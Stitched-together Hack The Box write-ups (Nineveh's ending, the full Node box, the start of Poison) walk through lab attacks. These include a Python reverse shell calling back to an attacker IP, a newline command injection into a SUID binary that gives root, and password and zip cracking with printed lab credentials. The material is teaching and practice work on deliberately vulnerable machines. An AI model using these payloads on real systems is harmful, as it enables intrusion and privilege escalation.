Next, extract the files.

```text
binwalk -Me nineveh.png
```

* **-e:** Automatically extract known file types.
* **-M:** Recursively scan extracted files.

Enter the directory that was extracted and output the results.

```text
cd _nineveh.png.extracted/secret/
```

We get back two files: nineveh.priv and nineveh.pub. When I find private keys the first thing I try is SSH-ing into the user’s account using the private key. However, if you remember, nmap did not report an open port that was running SSH. This brings us to the second thing we found during our privilege escalation phase that we didn’t look into.

When we ran LinEnum, it reported that port 22 was listening on localhost although nmap didn’t report the port as open. It turns out that there is a technique known as [port knocking](https://en.wikipedia.org/wiki/Port_knocking) used to externally open ports on a firewall by generating a connection attempt on a set of pre-specified closed ports. Once a correct sequence of connection attempts is received, the firewall rules are dynamically modified to allow the host which sent the connection attempts to connect over specific port\(s\).

In short, if you know the exact sequence of ports to connect to, you can open up port 22. To find the sequence you have to enumerate files on the server. This could be done using the LFI vulnerability we found.

First file we need is knockd.

```text
cat /etc/init.d/knockd
```

There, you’ll find a link to the configuration file /etc/knockd.conf. If you cat the file you’ll find the sequence of ports we have to hit.

```text
root@nineveh:/etc/init.d# cat /etc/knockd.conf 
[options]
 logfile = /var/log/knockd.log
 interface = ens33[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
```

What the file says is that you can open the SSH port by sending a TCP packet to the ports 571, 290 and 911 in sequence.

Let’s try that out.

```text
for x in 571 290 911; do nmap -Pn --max-retries 0 -p $x 10.10.10.43 && sleep 1; done
```

We use _-Pn_ to skip host discovery and _-max-retries 0_ to prevent any probe retransmissions. When you run the command, you get the following output.

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-28 21:53 EST
Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
Nmap scan report for nineveh.htb (10.10.10.43)
Host is up.PORT    STATE    SERVICE
571/tcp filtered umeterNmap done: 1 IP address (1 host up) scanned in 1.16 seconds
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-28 21:53 EST
Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
Nmap scan report for nineveh.htb (10.10.10.43)
Host is up.PORT    STATE    SERVICE
290/tcp filtered unknownNmap done: 1 IP address (1 host up) scanned in 1.16 seconds
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-28 21:53 EST
Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
Nmap scan report for nineveh.htb (10.10.10.43)
Host is up.PORT    STATE    SERVICE
911/tcp filtered xact-backupNmap done: 1 IP address (1 host up) scanned in 1.12 seconds
```

Then, run a general nmap scan to check if port 22 opened up.

```text
root@kali:~/Desktop/htb/nineveh# nmap 10.10.10.43
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-28 21:53 EST
Nmap scan report for nineveh.htb (10.10.10.43)
Host is up (0.033s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

It worked! Now you could SSH into amrois’s account using the private key we found.

```text
ssh -i nineveh.priv amrois@10.10.10.43
```

![](https://miro.medium.com/max/1190/1*eIH0OEDq4waJqkOv4eOQGA.png)

We’re in! This was a pretty neat solution, it’s the first I’m introduced to the concept of port knocking.

## Lessons Learned <a id="c9fc"></a>

To gain an initial foothold on the box we exploited five vulnerabilities.

1. Verbose message on the login form. The error message allowed us to enumerate a valid username. Therefore, whenever possible, always configure the application to use less ****verbose error messages. A better error message would be “The username or password is incorrect”.
2. Weak login credentials. We brute forced two login forms using hydra. The user should have used a sufficiently long password that is difficult to crack.
3. PHP code injection in the phpLiteAdmin page that allowed us to store a malicious file on the server. This could have been avoided if the user had patched the system and installed the most recent version of phpLiteAdmin.
4. Local File Inclusion \(LFI\) vulnerability that allowed us to call and execute the malicious file we stored on the server. Moreover, we were able to enumerate the port knocking sequence and open up the SSH port using this vulnerability. This could have been easily avoided if the developer validated user input.
5. Information disclosure vulnerability. This one is a no brainer. Do not make your private key publicly available for anyone to read, even if it is hidden in plain site.

To escalate privileges we exploited one vulnerability.

1. A scheduled task that ran a vulnerable version of the chkrootkit software. The software contained a vulnerability that allowed us to escalate to root privileges. Again, This could have been avoided if the user had patched the system and installed the most recent version of the software.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
node-writeup-w-o-metasploit.md
# Node Writeup w/o Metasploit

![](https://miro.medium.com/max/590/1*vOzQoHKlOvJN3khc5oj8pw.png)

## Reconnaissance <a id="8919"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA initial 10.10.10.58
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _initial_

We get back the following result showing that 2 ports are open:

* **Port 22:** running OpenSSH 7.2p2
* **Port 3000:** running Apache Hadoop

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-30 22:46 EST
Nmap scan report for 10.10.10.58
Host is up (0.032s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-datanode Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-title: MyPlace
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.96 seconds
```

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -p- -oA full 10.10.10.58
```

No other ports are open.

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -p- -oA udp 10.10.10.58
```

We get back the following result showing that no other ports are open.

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-31 06:35 EST
Nmap scan report for 10.10.10.58
Host is up (0.032s latency).
All 65535 scanned ports on 10.10.10.58 are open|filteredNmap done: 1 IP address (1 host up) scanned in 2355.48 seconds
```

Before we move on to enumeration, let’s make some mental notes about the nmap scan results.

* The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it’s unlikely that we gain initial access through this port, unless we find credentials.
* Ports 3000 is running a web server, so we’ll perform our standard enumeration techniques on it.

## Enumeration <a id="6ff4"></a>

I always start off with enumerating HTTP first.

**Port 3000**

Visit the application in the browser.

![](https://miro.medium.com/max/1334/1*_rVrmRbB-ZDk6su3LEBUOw.png)

View page source to to see if there are any left over comments, extra information, version number, etc.

```text
<script type="text/javascript" src="assets/js/app/app.js"></script>
<script type="text/javascript" src="assets/js/app/controllers/home.js"></script>
 <script type="text/javascript" src="assets/js/app/controllers/login.js"></script>
 <script type="text/javascript" src="assets/js/app/controllers/admin.js"></script>
 <script type="text/javascript" src="assets/js/app/controllers/profile.js"></script>
```

We find links to a bunch of custom scripts. The app.js & login.js scripts don’t give us anything useful. On the other hand, if you view the /home.js, you get the following code.

```text
var controllers = angular.module('controllers');controllers.controller('HomeCtrl', function ($scope, $http) {
  $http.get('/api/users/latest').then(function (res) {
    $scope.users = res.data;
  });
});
```

There’s a link to a list of users. Let’s see if that link is restricted.

![](https://miro.medium.com/max/948/1*sg-bYAkPxVLi40O-UG3F2Q.png)

We get back the above results giving us what seems to be usernames and hashed passwords. As stated with the “is-admin” flag, none of them have admin functionality.

Similarly, the /admin.js script contains the following code.

```text
var controllers = angular.module('controllers');controllers.controller('AdminCtrl', function ($scope, $http, $location, $window) {
  $scope.backup = function () {
    $window.open('/api/admin/backup', '_self');
  }$http.get('/api/session')
    .then(function (res) {
      if (res.data.authenticated) {
        $scope.user = res.data.user;
      }
      else {
        $location.path('/login');
      }
    });
});
```

When you visit the /api/admin/backup link, you get an “authenticated: false” error. This link is restricted but at least we know that the admin account has a backup file in it.

The /profile.js script contains the following code.

```text
var controllers = angular.module('controllers');controllers.controller('ProfileCtrl', function ($scope, $http, $routeParams) {
  $http.get('/api/users/' + $routeParams.username)
    .then(function (res) {
      $scope.user = res.data;
    }, function (res) {
      $scope.hasError = true;if (res.status == 404) {
        $scope.errorMessage = 'This user does not exist';
      }
      else {
        $scope.errorMessage = 'An unexpected error occurred';
      }
    });
});
```

When you visit the /api/users/ link, we get a full list of hashed user credentials, including the admin account!

![](https://miro.medium.com/max/951/1*zmprdKZy8QmVcXLODpwZtA.png)

Copy the credentials and save them in a file.

```text
dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240
de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73
5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0
```

Use a password cracking tool in order to crack as many passwords as possible. For this blog, I used an [online tool](https://crackstation.net/) since it’s faster than my local machine.

We get back the following result showing that it cracked 3/4 passwords.

![](https://miro.medium.com/max/854/1*8C3dVN7nnUtePV2-4yjUGw.png)

One thing to note here is none of the passwords are salted. This can be verified using the following command.

```text
echo -n "manchester" | sha256sum
dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af  -
```

This obviously considerably decreased the amount of time it would have taken the tool to crack all the passwords.

Let’s login with the admin’s account myP14ceAdm1nAcc0uNT/manchester.

![](https://miro.medium.com/max/1289/1*caAzMzFlNGAQgpSYvkiZvA.png)

Click on the _Download Backup_ button to download the file. Run the following command to determine the file type.

```text
root@kali:~/Desktop/htb/node# file myplace.backup 
myplace.backup: ASCII text, with very long lines, with no line terminators
```

It contains ASCII text. Let’s view the first few characters of the file.

```text
root@kali:~/Desktop/htb/node# head -c100 myplace.backup 
UEsDBAoAAAAAAHtvI0sAAAAAAAAAAAAAAAAQABwAdmFyL3d3dy9teXBsYWNlL1VUCQADyfyrWYAyC151eAsAAQQAAAAABAAAAABQ
```

This looks like base64 encoding. Let’s try and decode the file.

```text
cat myplace.backup | base64 --decode > myplace-decoded.backup
```

Now view the file type.

```text
root@kali:~/Desktop/htb/node# file myplace-decoded.backup 
myplace-decoded.backup: Zip archive data, at least v1.0 to extract
```

It’s a zip file! Let’s try and decompress it.

```text
root@kali:~/Desktop/htb/node# unzip myplace-decoded.backup
Archive:  myplace-decoded.backup
[myplace-decoded.backup] var/www/myplace/package-lock.json password:
```

It requires a password. Run a password cracker on the file.

```text
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt myplace-decoded.backup
```

* **-u:** try to decompress the first file by calling unzip with the guessed password
* **-D:** select dictionary mode
* **-p:** password file

It cracks the password!

```text
PASSWORD FOUND!!!!: pw == magicword
```

Unzip the file using the above password.

```text
unzip -P magicword myplace-decoded.backup
```

Now it’s a matter of going through the files to see if there are hard coded credentials, exploitable vulnerabilities, use of vulnerable dependencies, etc.

While reviewing the files, you’ll see hard coded mongodb credentials in the app.js file.

```text
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
```

We found a username ‘mark’ and a password ‘5AYRft73VtFpc84k’ to connect to mongodb locally. We also see a backup\_key which we’re not sure where it’s used, but we’ll make note of it.

## Initial Foothold <a id="c543"></a>

Most user’s reuse passwords, so let’s use the password we found to SSH into mark’s account.

```text
ssh mark@10.10.10.58
```

It worked! Let’s locate the user.txt flag and view it’s contents.

```text
mark@node:~$ locate user.txt
/home/tom/user.txt
mark@node:~$ cat /home/tom/user.txt 
cat: /home/tom/user.txt: Permission denied
```

We need to either escalate our privileges to tom or root in order to view the flag.

Let’s transfer the LinEnum script from our attack machine to the target machine.

In the attack machine, start up a server in the same directory that the script resides in.

```text
python -m SimpleHTTPServer 5555
```

In the target machine, move to the /tmp directory where we have write privileges and download the LinEnum script.

```text
cd /tmp
wget http://10.10.14.12:5555/LinEnum.sh
```

Give it execute privileges.

```text
chmod +x LinEnum.sh
```

Run the script.

```text
./LinEnum.sh
```

Below are the important snippets of the script output that will allow us to escalate privileges to tom.

```text
### NETWORKING  ##########################################
.....
[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -
.....### SERVICES #############################################
[-] Running processes:USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
.....
tom       1196  0.0  7.3 1028640 56072 ?       Ssl  03:44   0:06 /usr/bin/node /var/www/myplace/app.js
mongodb   1198  0.5 11.6 281956 87956 ?        Ssl  03:44   2:43 /usr/bin/mongod --auth --quiet --config /etc/mongod.conf
tom       1199  0.0  5.9 1074616 45264 ?       Ssl  03:44   0:07 /usr/bin/node /var/scheduler/app.js
....
```

The **networking** section tells us that mongodb is listening locally on port 27017. We can connect to it because we found hardcoded credentials in the app.js file. The **services** section tells us that there is a process compiling the app.js file that is being run by Tom. Since we are trying to escalate our privileges to Toms’, let’s investigate this file.

```text
mark@node:/tmp$ ls -la /var/scheduler/
total 28
drwxr-xr-x  3 root root 4096 Sep  3  2017 .
drwxr-xr-x 15 root root 4096 Sep  3  2017 ..
-rw-rw-r--  1 root root  910 Sep  3  2017 app.js
drwxr-xr-x 19 root root 4096 Sep  3  2017 node_modules
-rw-rw-r--  1 root root  176 Sep  3  2017 package.json
-rw-r--r--  1 root root 4709 Sep  3  2017 package-lock.json
```

We only have permissions to read the file, so we can’t simply include a reverse shell in there. Let’s view the file, maybe we can exploit it in another way.

```text
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);});
```

If you’re like me and you’re not too familiar with the mongodb structure, then [this ](https://www.includehelp.com/mongodb/a-deep-dive-into-mongo-database.aspx)[diagram](https://www.includehelp.com/mongodb/a-deep-dive-into-mongo-database.aspx) might help.

![](https://miro.medium.com/max/463/1*m1Xbnhc76OWw5MgSrAfvjQ.png)

We login using mark’s credentials and access the scheduler database. The set interval function seems to be checking for documents \(equivalent to rows\) in the tasks collection \(equivalent to tables\). For each document it executes the cmd field. Since we do have access to the database, we can add a document that contains a reverse shell as the cmd value to escalate privileges.

Let’s connect to the database.

```text
mongo -u mark -p 5AYRft73VtFpc84k localhost:27017/scheduler
```

* **-u:** username
* **-p:** password
* **host:port/db:** connection string

Let’s run a few commands to learn more about the database.

```text
# Lists the database name
> db
scheduler# Shows all the tables in the database - equivalent to 'show tables'
> show collections
tasks# List content in tasks table - equivalent to 'select * from tasks'
> db.tasks.find()
```

The tasks collection does not contain any documents. Let’s add one that sends a[ reverse shell ](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)back to our attack machine.

```text
# insert document that contains a reverse shell
db.tasks.insert({cmd: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.12\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"})# double check that the document got added properly.
db.tasks.find()
```

Set up a listener to receive the reverse shell.

```text
nc -nlvp 1234
```

Wait for the scheduled task to run.

![](https://miro.medium.com/max/976/1*pn6ccKnFendlQLV4amy6rw.png)

We get a shell! Let’s upgrade it to a better shell.

```text
python -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell. To get a fully interactive shell, background the session \(CTRL+ Z\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

Once that is done, run the command “fg” to bring netcat back to the foreground.

Grab the user.txt flag.

![](https://miro.medium.com/max/614/1*c2OPDps8LPRrtQz22yUGFg.png)

To grab the root.txt flag, we need to escalate our privileges to root.

## Privilege Escalation <a id="d22d"></a>

First, print the real and effective user and group IDs of the user.

```text
tom@node:/tmp$ id
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
```

Second, review the LinEnum script for any info/files that are either associated to Tom’s id or groups that he is in.

After sifting through all the output from the script, we notice the following file which has the SUID bit set.

```text
[-] SUID files:
-rwsr-xr-- 1 root admin 16484 Sep  3  2017 /usr/local/bin/backup
```

Since the SUID bit is set for this file, it will execute with the level of privilege that matches the user who owns the file. In this case, the file is owned by root, so the file will execute with root privileges. From the previous command that we ran, we know that Tom is in the group 1002 \(admin\) and therefore can read and execute this file.

We did see this file getting called in the app.js script.

```text
....
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
....app.get('/api/admin/backup', function (req, res) {
    if (req.session.user && req.session.user.is_admin) {
      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
      var backup = '';proc.on("exit", function(exitCode) {
        res.header("Content-Type", "text/plain");
        res.header("Content-Disposition", "attachment; filename=myplace.backup");
        res.send(backup);
      });proc.stdout.on("data", function(chunk) {
        backup += chunk;
      });proc.stdout.on("end", function() {
      });
    }
    else {
      res.send({
        authenticated: false
      });
    }
  });
```

The file takes in three arguments:

* The string ‘-q’
* A backup key which is passed at the beginning of the script
* A directory path

Let’s try running the file with the above arguments.

```text
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp
```

We get a base64 decoded string. Based on the output of the program, I’m going to go out on a limb and say that it’s backing up the directory path that is passed as an argument.

To verify that, run the command again and save it in file test, then base64 decode that file.

```text
tom@node:/tmp$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp > testtom@node:/tmp$ cat test | base64 --decode > test-decodedtom@node:/tmp$ file test-decoded 
test-decoded: Zip archive data, at least v1.0 to extracttom@node:/tmp$ unzip test-decoded
Archive:  test-decoded
   creating: tmp/
   creating: tmp/systemd-private-668dc95e5f5945b897532b0ae5e207b1-systemd-timesyncd.service-CwnioT/
   creating: tmp/systemd-private-668dc95e5f5945b897532b0ae5e207b1-systemd-timesyncd.service-CwnioT/tmp/
[test-decoded] tmp/test password: 
 extracting: tmp/test                
   creating: tmp/.Test-unix/
  inflating: tmp/LinEnum.sh          
   creating: tmp/.XIM-unix/
   creating: tmp/vmware-root/
   creating: tmp/.X11-unix/
   creating: tmp/.ICE-unix/
   creating: tmp/.font-unix/
  inflating: tmp/pspy64
```

When decompressing the file, we use the same password we cracked earlier.

Alright, let’s pass the root.txt file path as an argument to the backup program.

```text
tom@node:/tmp$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root > roottom@node:/tmp$ cat root | base64 --decode > root-decodedroot@kali:~/Desktop/htb/node# file root-decoded
root-decoded: Zip archive data, at least v?[0x333] to extractroot@kali:~/Desktop/htb/node# 7z x root-decoded
```

**Note:** When I used unzip on the root zip file, I kept getting a “need PK compat. v5.1 \(can do v4.6\)” message. So I had to transfer the file to my attack machine and use 7z instead.

Let’s output the root.txt file.

![](https://miro.medium.com/max/620/1*M0Y4-VaSgll3oIURyDKcRg.png)

We get the troll face.

Something in the backup file is intentionally preventing us from getting the root flag. Let’s run the ltrace program to see what system commands are getting called when we run the backup program.

```text
ltrace /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /../../etc > test
```

We get back the following result.

```text
strstr("/tmp", "..")                             = nil
strstr("/tmp", "/root")                          = nil
strchr("/tmp", ';')                              = nil
strchr("/tmp", '&')                              = nil
strchr("/tmp", '`')                              = nil
strchr("/tmp", '$')                              = nil
strchr("/tmp", '|')                              = nil
strstr("/tmp", "//")                             = nil
strcmp("/tmp", "/")                              = 1
strstr("/tmp", "/etc")                           = nil
strcpy(0xff98a1ab, "/tmp")                       = 0xff98a1ab
```

Let’s look up what the functions do.

* **strstr:** returns pointer to first occurrence of str2 in str1
* **strchr:** returns pointer to first occurrence of char in str1
* **strcmp: r**eturns 0 if str1 is same as str2

As can be seen, the program is filtering the directory path string. If we include any of the strings enclosed in the strchr or strstr function as a directory path, we end up with a troll face. Similarly, if the directory path is a single “/”, we also get a troll face. So we’re allowed to use a backslash as long as it’s included as a string with other characters.

**Note:** There are several methods we can use apply on the backup program in order to escalate privileges. I initially solved it using method 1 & method 2, however, after I watched [ippsec](https://www.youtube.com/watch?v=sW10TlZF62w)’s video, I found out there were other ways to escalate privileges \(methods 3, 4 & 5\).

**Method 1 — Using Wildcards**

The \* character is not filtered in the program, therefore we can use it to make a backup of the root directory.

```text
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt > root
```

Then use the same method to base64 decode and compress the file to view the flag.

![](https://miro.medium.com/max/629/1*F02qM-0wEgiCCrk8oS5Myw.png)

**Method 2 — Using the Home Variable**

The ~ character is not filtered either, so we can make use of it to make a backup of the root directory.

First, set the $HOME environment variable to be /root.

```text
export HOME=/root
```

Then, call the backup program with the ~ character.

```text
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "~"
```

**Method 3— Using Symlinks**

A symbolic link is a file that points to another file. Let’s point the root.txt file to a file called alt-file.txt.

```text
tom@node:/tmp$ mkdir altdir
tom@node:/tmp$ cd altdir/
tom@node:/tmp/altdir$ ln -s /root/root.txt altfile
```

* **-s:** make symbolic links instead of hard links

Then, call the backup program with the link file.

```text
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp/altdir
```

**Method 4— Command Injection**

The past three methods involved us exploiting the backup file in a way that gives us access to a privileged file. We haven’t really escalated our privileges to root. This method exploits a command injection vulnerability that will give us a shell with root privileges.

Run ltrace again on the program to backup a file that doesn’t exist, in our case, we name that file “bla”

```text
ltrace -s 200 ./backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 bla
```

You get the following system call.

```text
...
system("/usr/bin/zip -r -P magicword /tmp/.backup_725656931 bla > /dev/null" <no return ...>
...
```

It runs the zip command on the file name. Since the input is only partially validated against the list of characters we found above, we can exploit this to get command execution.

One thing to note is that it does send the output to /dev/null and therefore to bypass that we have to pass a random command/string after our bash shell command.

The new line character \(\n\) is not blacklisted and so we can use it as part of our exploit. In order to execute multiple commands in the system command we usually use the “;” character but that is blacklisted, so we’ll resort to using the new line character “\n”

```text
# set a new line variable
newline=$'\n'# exploit
./backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "bla${newline}/bin/bash${newline}bla"
```

The way the exploit works is it first runs the zip command on the first “bla” we encounter, then it reaches the new line and runs the command /bin/bash giving us a shell and then sends the output of the second “bla” to /dev/null.

![](https://miro.medium.com/max/1025/1*RAZHi8w4kX6ug2SZDV0U-w.png)

This gives us root access to the machine!

Another way of doing it is using the printf command.

```text
newline=$'\n'
./backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "$(printf 'bla\n/bin/bash\nbla')"
```

**Method 5— Buffer Overflow**

I unfortunately still don’t know how to exploit buffer overflow vulnerabilities yet. When I do, I’ll update this blog explaining how to escalate privileges using a buffer overflow exploit. In the mean time, both [ippsec](https://www.youtube.com/watch?v=sW10TlZF62w) and [rastating](https://rastating.github.io/hackthebox-node-walkthrough/) have walkthroughs explaining it.

## Lessons Learned <a id="3130"></a>

To gain an initial foothold on the box we exploited three vulnerabilities.

1. Broken access control. The /users API endpoint was exposed and that allowed us to get a list of credentials without having any access rights. Although access control is being done on other endpoints, the developers must have forgotten to restrict access to this endpoint. Proper access control should be applied on all sensitive API endpoints.
2. Weak login credentials and insecure hashing implementation. We were able to crack the passwords we found in the users file in a matter of seconds. That was due to two reasons: \(1\) the users had chosen easy passwords that were easily crackable, and \(2\) the passwords were not salted and therefore they can be easily looked up in a pre-computed table \(rainbow tables\) to see if the given password hash matches any of the hashes in the table. Therefore, to avoid this, the application developers should enforce strong password policies on users and use a salt when hashing users’ passwords.
3. Weak encryption credentials. The backup file we found was zipped and encrypted with a weak password. The administrators should have used a sufficiently long password that is not easily crackable.
4. Hard coded credentials and password reuse. After cracking the password on the zipped file we found an app.js file that contains hard coded credentials. Although the credentials were for mongodb, a service that was not publicly exposed, the user used the same credentials for his SSH account. This final vulnerability chained with the above listed vulnerabilities allowed us to gain initial access to the box. When possible, developers should not embed credentials in files and security awareness should be given to users on password management best practices.

To escalate privileges we exploited two vulnerability.

1. Security misconfiguration of app.js. The app.js file was being run as a scheduled task by the ‘tom’ user, although the file was executing code from mongodb using a less privileged user’s credentials \(mark\). This allowed us to escalate our privileges to ‘tom’. To avoid that, mark should have been the owner of the scheduled task.
2. Insufficient user input validation in backup binary. The user ‘tom’ was configured to be in the admin group and therefore had execute rights on the backup binary. However, this binary file had the suid bit set and was owned by root. Since command line arguments were not properly validated, we were able to exploit a command injection to get root level access on the system. This could have been avoided if user input was properly validated — whitelisting instead of blacklisting, use of safe functions, etc.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
poison-writeup-w-o-metasploit.md
# Poison Writeup w/o Metasploit

![](https://miro.medium.com/max/578/1*N-q7Pj36SfSkKnJZct4Y3Q.png)

## Reconnaissance <a id="5226"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA initial 10.10.10.84
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _initial_

We get back the following result showing that 2 ports are open:

* **Port 22:** running OpenSSH 7.2
* **Port 80:** running Apache httpd 2.4.29

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-03 22:13 EST                                                                                                                
Nmap scan report for 10.10.10.84                                                                                                                                               
Host is up (0.031s latency).                                                                                                                                                   
Not shown: 998 closed ports                                                                                                                                                    
PORT   STATE SERVICE VERSION                                                                                                                                                   
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)                                                                                                              
| ssh-hostkey:                                                                                                                                                                 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)                                                                                                                 
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)                                                                                                                
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)                                                                                                              
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=1/3%OT=22%CT=1%CU=35958%PV=Y%DS=2%DC=I%G=Y%TM=5E1002E4
.....
Network Distance: 2 hops
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsdOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.65 seconds
```

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -p- -oA full 10.10.10.84
```

No other ports are open.

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -p- -oA udp 10.10.10.84
```

We get back the following result showing that no other ports are open.

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-03 22:16 EST
Nmap scan report for 10.10.10.84
Host is up (0.034s latency).
Not shown: 65534 closed ports
PORT    STATE         SERVICE
514/udp open|filtered syslogNmap done: 1 IP address (1 host up) scanned in 3340.51 seconds
```

Before we move on to enumeration, let’s make some mental notes about the nmap scan results.

* The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it’s unlikely that we gain initial access through this port, unless we find credentials.
